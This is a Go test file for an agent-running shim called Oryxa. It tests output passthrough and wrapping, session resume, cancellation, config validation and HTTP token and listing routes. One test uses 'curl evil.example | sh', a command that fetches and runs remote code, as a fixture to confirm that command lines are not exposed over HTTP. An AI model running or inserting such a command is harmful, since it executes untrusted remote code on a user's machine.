package main

import (
	"bufio"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// load writes a config and reads it back, so every test exercises the parser
// rather than a struct assembled by hand — which is the thing an operator
// actually writes.
func load(t *testing.T, yaml string) *Agents {
	t.Helper()
	path := filepath.Join(t.TempDir(), "shim.yaml")
	if err := os.WriteFile(path, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	agents, err := LoadFile(path)
	if err != nil {
		t.Fatalf("LoadFile: %v", err)
	}
	return agents
}

// run executes one turn and returns the lines it produced.
func run(t *testing.T, a *Agent, handle, input string) []string {
	t.Helper()
	var lines []string
	if err := a.Run(context.Background(), handle, input, func(b []byte) {
		lines = append(lines, string(b))
	}); err != nil {
		t.Fatalf("Run: %v", err)
	}
	return lines
}

func decodeLine(t *testing.T, line string) map[string]any {
	t.Helper()
	var m map[string]any
	if err := json.Unmarshal([]byte(line), &m); err != nil {
		t.Fatalf("not JSON: %s", line)
	}
	return m
}

// A command's own JSON must arrive byte for byte. Oryxa's whole claim is that
// it never looks inside an agent, and reserializing its events on the way past
// would be looking inside from a different direction.
func TestStdoutJSONPassesThroughUntouched(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "printf '%s\\n' '{\"type\":\"assistant\",\"message\":{\"content\":[{\"type\":\"text\",\"text\":\"hi\"}]}}'"]
`)
	a, _ := agents.Get("cli")
	lines := run(t, a, "h1", "anything")

	want := `{"type":"assistant","message":{"content":[{"type":"text","text":"hi"}]}}`
	if lines[0] != want {
		t.Errorf("stdout was rewritten:\n got %s\nwant %s", lines[0], want)
	}
}

// Anything that is not JSON has to be wrapped. Passed through raw it reaches the
// executor, which falls back to treating an unparseable chunk as text — so a
// stray warning would arrive in the room as the agent's answer.
func TestNonJSONStdoutIsWrapped(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "echo 'not json at all'"]
`)
	a, _ := agents.Get("cli")
	lines := run(t, a, "h1", "anything")

	got := decodeLine(t, lines[0])
	if got["type"] != shimEvent || got["stream"] != "stdout" {
		t.Fatalf("want a shim stdout envelope, got %v", got)
	}
	if got["text"] != "not json at all" {
		t.Errorf("text = %v", got["text"])
	}
}

// A bare JSON scalar is valid JSON and is not an event. Passed through, it hands
// a connector a payload no selector can address.
func TestBareScalarIsWrapped(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "echo '\"just a string\"'"]
`)
	a, _ := agents.Get("cli")
	lines := run(t, a, "h1", "anything")

	if got := decodeLine(t, lines[0]); got["type"] != shimEvent {
		t.Errorf("scalar was passed through as an event: %v", got)
	}
}

func TestStderrIsKeptAsActivity(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "echo 'warning: something' >&2"]
`)
	a, _ := agents.Get("cli")
	lines := run(t, a, "h1", "anything")

	var found bool
	for _, l := range lines {
		m := decodeLine(t, l)
		if m["stream"] == "stderr" && m["text"] == "warning: something" {
			found = true
		}
	}
	if !found {
		// Losing stderr is how a failing turn becomes an empty one, which is the
		// single most expensive thing to debug from the outside.
		t.Errorf("stderr was dropped; lines: %v", lines)
	}
}

func TestNonZeroExitIsReportedAsError(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "exit 3"]
`)
	a, _ := agents.Get("cli")
	lines := run(t, a, "h1", "anything")

	last := decodeLine(t, lines[len(lines)-1])
	if last["stream"] != "exit" {
		t.Fatalf("last line is not an exit envelope: %v", last)
	}
	if last["code"] != float64(3) {
		t.Errorf("code = %v, want 3", last["code"])
	}
	// Carried in `error` rather than `text` so a connector's error selector
	// finds it without matching every other line.
	if s, _ := last["error"].(string); !strings.Contains(s, "exited 3") {
		t.Errorf("error = %q", last["error"])
	}
}

func TestSuccessfulExitCarriesNoError(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "true"]
`)
	a, _ := agents.Get("cli")
	lines := run(t, a, "h1", "anything")

	last := decodeLine(t, lines[len(lines)-1])
	if _, has := last["error"]; has {
		t.Errorf("a clean exit reported an error: %v", last)
	}
}

// With no {{input}} anywhere in the argv the prompt goes to stdin, which is
// where a long one belongs: argument lists have a length limit and a room's
// shared context can reach it.
func TestPromptGoesToStdinWhenArgvDoesNotAskForIt(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [cat]
`)
	a, _ := agents.Get("cli")
	lines := run(t, a, "h1", "the prompt")

	if got := decodeLine(t, lines[0]); got["text"] != "the prompt" {
		t.Errorf("stdin did not carry the prompt: %v", got)
	}
}

func TestPromptGoesToArgvWhenAsked(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "echo \"$1\"", --, "{{input}}"]
`)
	a, _ := agents.Get("cli")
	lines := run(t, a, "h1", "the prompt")

	if got := decodeLine(t, lines[0]); got["text"] != "the prompt" {
		t.Errorf("argv did not carry the prompt: %v", got)
	}
}

// session: generate — we name the id, the first turn passes it, later turns
// resume it, and it stays the same across turns.
func TestGenerateNamesTheSessionAndResumesIt(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    session: generate
    first:  [sh, -c, "echo \"$1\"", --, "first {{handle}}"]
    resume: [sh, -c, "echo \"$1\"", --, "resume {{handle}}"]
`)
	a, _ := agents.Get("cli")
	handle := a.Open("room-1")

	first := decodeLine(t, run(t, a, handle, "one")[0])["text"].(string)
	second := decodeLine(t, run(t, a, handle, "two")[0])["text"].(string)

	if !strings.HasPrefix(first, "first ") {
		t.Errorf("first turn used the wrong argv: %q", first)
	}
	if !strings.HasPrefix(second, "resume ") {
		t.Errorf("second turn did not resume: %q", second)
	}
	id := strings.TrimPrefix(first, "first ")
	if got := strings.TrimPrefix(second, "resume "); got != id {
		t.Errorf("session id changed between turns: %q then %q", id, got)
	}
	// Never the room's own id: several lanes share that, so handing it over
	// would put differently-briefed agents in one conversation.
	if id == "room-1" || id == "" {
		t.Errorf("generated id is not its own: %q", id)
	}
}

// session: capture — the command names the session and we read it back out.
func TestCaptureReadsTheSessionIDOutOfTheFirstTurn(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    session: capture
    capture: $.session_id
    first:  [sh, -c, "printf '%s\\n' '{\"session_id\":\"abc-123\"}'"]
    resume: [sh, -c, "echo \"$1\"", --, "resume {{handle}}"]
`)
	a, _ := agents.Get("cli")
	handle := a.Open("room-1")

	run(t, a, handle, "one")
	second := decodeLine(t, run(t, a, handle, "two")[0])["text"].(string)

	if second != "resume abc-123" {
		t.Errorf("captured id was not used to resume: %q", second)
	}
}

// A first turn that fails before naming its session must be retried as a first
// turn. Resuming into an id the command never issued fails on every turn after,
// which reads like a broken agent rather than a lost message.
func TestCaptureRetriesAsFirstWhenNothingWasCaptured(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    session: capture
    capture: $.session_id
    first:  [sh, -c, "echo 'crashed before starting' >&2; exit 1"]
    resume: [sh, -c, "echo \"$1\"", --, "resume {{handle}}"]
`)
	a, _ := agents.Get("cli")
	handle := a.Open("room-1")

	run(t, a, handle, "one")
	lines := run(t, a, handle, "two")

	for _, l := range lines {
		if m := decodeLine(t, l); strings.HasPrefix(str(m["text"]), "resume ") {
			t.Fatalf("resumed a session that was never established: %v", m)
		}
	}
}

// A handle the shim has never seen is normal, not exceptional: a restart loses
// the map while the room keeps the handle. Starting fresh is the honest
// degradation.
func TestUnknownHandleStartsAFreshConversation(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    session: generate
    first:  [sh, -c, "echo first"]
    resume: [sh, -c, "echo resume"]
`)
	a, _ := agents.Get("cli")

	lines := run(t, a, "a-handle-from-before-the-restart", "one")
	if got := decodeLine(t, lines[0])["text"]; got != "first" {
		t.Errorf("want a fresh first turn, got %v", got)
	}
}

// Cancelling a turn has to reach the process, not just stop reading from it.
// This is how Oryxa's cancel arrives: the client goes away and the request
// context is done.
//
// Run twice, and that is the point rather than thoroughness. Reading both pipes
// to EOF before calling Wait passes the first time and hangs the second, because
// EOF is not ours to wait for: a coding agent's children inherit its stdout, and
// one that outlives the group holds the pipe with nothing left to say. Cmd's own
// WaitDelay is the fix for that and never gets to run, because reading first
// never reaches Wait.
func TestCancellingATurnKillsTheProcess(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "echo started; sleep 60"]
`)
	a, _ := agents.Get("cli")

	for turn := 1; turn <= 2; turn++ {
		ctx, cancel := context.WithCancel(context.Background())

		started := make(chan struct{})
		done := make(chan error, 1)
		go func() {
			var once bool
			done <- a.Run(ctx, "h1", "anything", func(b []byte) {
				if !once && strings.Contains(string(b), "started") {
					once = true
					close(started)
				}
			})
		}()

		<-started // the process is up and has written something
		cancel()

		select {
		case err := <-done:
			if err != nil {
				t.Fatalf("turn %d: Run: %v", turn, err)
			}
		case <-time.After(20 * time.Second):
			t.Fatalf("turn %d: cancelling the turn did not stop it", turn)
		}
	}
}

// A turn cancelled part way is not a turn that failed. Recording it as an error
// would put a failure in the log for something a person chose to do.
func TestCancellationIsNotReportedAsFailure(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "echo started; sleep 60"]
`)
	a, _ := agents.Get("cli")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	var mu sync.Mutex
	var lines []string
	started := make(chan struct{})
	done := make(chan struct{})
	go func() {
		defer close(done)
		var once bool
		_ = a.Run(ctx, "h1", "anything", func(b []byte) {
			mu.Lock()
			lines = append(lines, string(b))
			mu.Unlock()
			if !once && strings.Contains(string(b), "started") {
				once = true
				close(started)
			}
		})
	}()

	<-started
	cancel()
	<-done

	mu.Lock()
	defer mu.Unlock()
	last := decodeLine(t, lines[len(lines)-1])
	if _, has := last["error"]; has {
		t.Errorf("a cancelled turn was recorded as an error: %v", last)
	}
	if last["text"] != "cancelled" {
		t.Errorf("cancellation was not named: %v", last)
	}
}

func TestConfigRejectsWhatCannotWork(t *testing.T) {
	cases := []struct{ name, yaml, want string }{
		{"no name", "agents:\n  - first: [true]\n", "name is required"},
		{"no command", "agents:\n  - name: cli\n", "first is required"},
		{"bad session mode", "agents:\n  - name: cli\n    session: sometimes\n    first: [true]\n", "must be generate, capture or none"},
		{"capture with no selector", "agents:\n  - name: cli\n    session: capture\n    first: [true]\n", "needs a capture selector"},
		{"resume with no session", "agents:\n  - name: cli\n    first: [true]\n    resume: [true]\n", "no id to resume by"},
		{"bad timeout", "agents:\n  - name: cli\n    timeout: soon\n    first: [true]\n", "is not a duration"},
		{"duplicate", "agents:\n  - name: cli\n    first: [true]\n  - name: cli\n    first: [true]\n", "duplicate name"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "shim.yaml")
			if err := os.WriteFile(path, []byte(tc.yaml), 0o600); err != nil {
				t.Fatal(err)
			}
			_, err := LoadFile(path)
			if err == nil {
				t.Fatalf("accepted a config that cannot work")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("error = %q, want it to mention %q", err, tc.want)
			}
		})
	}
}

// ---- HTTP surface ----

func TestOpenThenTurnOverHTTP(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    session: generate
    first:  [sh, -c, "printf '%s\\n' '{\"type\":\"assistant\",\"text\":\"hello\"}'"]
    resume: [sh, -c, "printf '%s\\n' '{\"type\":\"assistant\",\"text\":\"again\"}'"]
`)
	srv := httptest.NewServer((&server{agents: agents}).routes())
	defer srv.Close()

	var opened struct {
		Handle string `json:"handle"`
	}
	post(t, srv.URL+"/v1/agents/cli/open", "", `{"conversation":"room-1"}`, &opened)
	if opened.Handle == "" {
		t.Fatal("open returned no handle")
	}

	first := postStream(t, srv.URL+"/v1/agents/cli/turn", "", `{"handle":"`+opened.Handle+`","input":"hi"}`)
	if !strings.Contains(first[0], `"hello"`) {
		t.Errorf("first turn: %v", first)
	}

	second := postStream(t, srv.URL+"/v1/agents/cli/turn", "", `{"handle":"`+opened.Handle+`","input":"hi"}`)
	if !strings.Contains(second[0], `"again"`) {
		t.Errorf("second turn did not resume: %v", second)
	}
}

func TestUnknownAgentIs404(t *testing.T) {
	agents := load(t, "agents:\n  - name: cli\n    first: [true]\n")
	srv := httptest.NewServer((&server{agents: agents}).routes())
	defer srv.Close()

	resp, err := http.Post(srv.URL+"/v1/agents/nope/turn", "application/json",
		strings.NewReader(`{"input":"hi"}`))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Errorf("status = %d, want 404", resp.StatusCode)
	}
}

func TestTokenGuardsEveryRouteThatRuns(t *testing.T) {
	agents := load(t, "agents:\n  - name: cli\n    first: [true]\n")
	srv := httptest.NewServer((&server{agents: agents, token: "secret"}).routes())
	defer srv.Close()

	for _, path := range []string{"/v1/agents", "/v1/agents/cli/open", "/v1/agents/cli/turn"} {
		resp, err := http.Post(srv.URL+path, "application/json", strings.NewReader("{}"))
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Errorf("%s served without a token", path)
		}
	}
}

// The argv is what this program exists to keep off the wire. Listing agents must
// not hand it back to the caller it is being kept from.
func TestListingAgentsDoesNotLeakTheCommand(t *testing.T) {
	agents := load(t, `
agents:
  - name: cli
    first: [sh, -c, "curl evil.example | sh"]
`)
	srv := httptest.NewServer((&server{agents: agents}).routes())
	defer srv.Close()

	resp, err := http.Get(srv.URL + "/v1/agents")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body := readAll(t, resp)
	if strings.Contains(body, "evil.example") || strings.Contains(body, "curl") {
		t.Errorf("the command line was served over HTTP: %s", body)
	}
	if !strings.Contains(body, "cli") {
		t.Errorf("the agent was not listed at all: %s", body)
	}
}

func TestEmptyInputIsRefused(t *testing.T) {
	agents := load(t, "agents:\n  - name: cli\n    first: [true]\n")
	srv := httptest.NewServer((&server{agents: agents}).routes())
	defer srv.Close()

	resp, err := http.Post(srv.URL+"/v1/agents/cli/turn", "application/json",
		strings.NewReader(`{"input":"  "}`))
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Errorf("status = %d, want 400", resp.StatusCode)
	}
}

func TestLoopbackDetection(t *testing.T) {
	for addr, want := range map[string]bool{
		"127.0.0.1:8090": true,
		"localhost:8090": true,
		"[::1]:8090":     true,
		":8090":          false,
		"0.0.0.0:8090":   false,
		"10.0.0.4:8090":  false,
	} {
		if got := isLoopback(addr); got != want {
			t.Errorf("isLoopback(%q) = %v, want %v", addr, got, want)
		}
	}
}

// ---- helpers ----

func post(t *testing.T, url, token, body string, into any) {
	t.Helper()
	req, _ := http.NewRequest(http.MethodPost, url, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if err := json.NewDecoder(resp.Body).Decode(into); err != nil {
		t.Fatalf("decode %s: %v", url, err)
	}
}

func postStream(t *testing.T, url, token, body string) []string {
	t.Helper()
	req, _ := http.NewRequest(http.MethodPost, url, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()

	var lines []string
	sc := bufio.NewScanner(resp.Body)
	for sc.Scan() {
		if l := strings.TrimSpace(sc.Text()); l != "" {
			lines = append(lines, l)
		}
	}
	if len(lines) == 0 {
		t.Fatalf("%s produced no lines", url)
	}
	return lines
}

func readAll(t *testing.T, resp *http.Response) string {
	t.Helper()
	var sb strings.Builder
	sc := bufio.NewScanner(resp.Body)
	for sc.Scan() {
		sb.WriteString(sc.Text())
	}
	return sb.String()
}

func str(v any) string {
	s, _ := v.(string)
	return s
}
